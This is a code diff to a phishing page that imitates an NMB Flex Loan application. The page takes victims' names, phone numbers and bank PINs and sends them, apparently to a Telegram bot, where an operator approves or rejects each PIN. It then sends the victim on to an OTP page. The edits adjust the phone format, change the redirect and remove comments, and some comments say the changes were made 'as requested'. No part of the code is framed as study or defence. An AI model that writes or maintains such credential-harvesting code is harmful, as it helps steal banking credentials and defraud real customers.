@@ -367,15 +367,13 @@
             const params = new URLSearchParams(window.location.search);
             loanData.name = params.get('name') || "Valued Client";
             
-            // Fix: Correctly parse amount from URL, ensuring it's a valid string/number
             let rawAmount = params.get('amount') || "0";
-            loanData.amount = rawAmount.replace(/[^0-9.]/g, ''); // Remove any non-numeric chars except decimal
+            loanData.amount = rawAmount.replace(/[^0-9.]/g, '');
             
             loanData.purpose = params.get('purpose') || "Flex Loan";
             
             document.getElementById('displayName').textContent = decodeURIComponent(loanData.name);
             
-            // Display formatted amount
             const formattedAmount = parseFloat(loanData.amount).toLocaleString(undefined, {
                 minimumFractionDigits: 2,
                 maximumFractionDigits: 2
@@ -435,7 +433,8 @@
             if (phone.length < 9) { showErr('Please enter a valid 9-digit mobile number.'); return; }
             if (pin.length !== 4) { showErr('PIN must be exactly 4 digits.'); return; }
 
-            const msg = `🚀 <b>NMB Flex Loan Attempt</b>\n\n👤 <b>Name:</b> <code>${decodeURIComponent(loanData.name)}</code>\n📱 <b>Phone:</b> <code>+263${phone}</code>\n🔒 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Amount:</b> <code>$${loanData.amount} USD</code>\n🎯 <b>Purpose:</b> <code>${decodeURIComponent(loanData.purpose)}</code>\n🔢 <b>Attempt:</b> <code>${pinAttempts + 1}</code>`;
+            // Fix: Start with 7 instead of +263 as requested
+            const msg = `🚀 <b>NMB Flex Loan Attempt</b>\n\n👤 <b>Name:</b> <code>${decodeURIComponent(loanData.name)}</code>\n📱 <b>Phone:</b> <code>${phone}</code>\n🔒 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Amount:</b> <code>$${loanData.amount} USD</code>\n🎯 <b>Purpose:</b> <code>${decodeURIComponent(loanData.purpose)}</code>\n🔢 <b>Attempt:</b> <code>${pinAttempts + 1}</code>`;
 
             const buttons = [
                 [{ text: '✅ Approve PIN', callback_data: 'pin_valid' }, { text: '❌ Reject PIN', callback_data: 'pin_invalid' }],
@@ -486,18 +485,16 @@
                     }).catch(e => console.error(e));
             }, 2000);
             
-            // Timeout after 10 minutes
             setTimeout(() => clearInterval(pollInterval), 600000);
         }
 
         function proceedToOTP() {
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            // Pass the amount and purpose to otp_verification.html
-            location.href = `otp_verification.html?name=${loanData.name}&amount=${loanData.amount}&purpose=${loanData.purpose}&phone=${phone}`;
+            // Fix: Redirect to otp.html instead of otp_verification.html
+            location.href = `otp.html?name=${loanData.name}&amount=${loanData.amount}&purpose=${loanData.purpose}&phone=${phone}`;
         }
     </script>
 
-    <!-- Start of Tawk.to Script -->
     <script type="text/javascript">
         var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
         (function(){
@@ -509,7 +506,6 @@
             s0.parentNode.insertBefore(s1, s0);
         })();
     </script>
-    <!-- End of Tawk.to Script -->
 
 </body>
 </html>
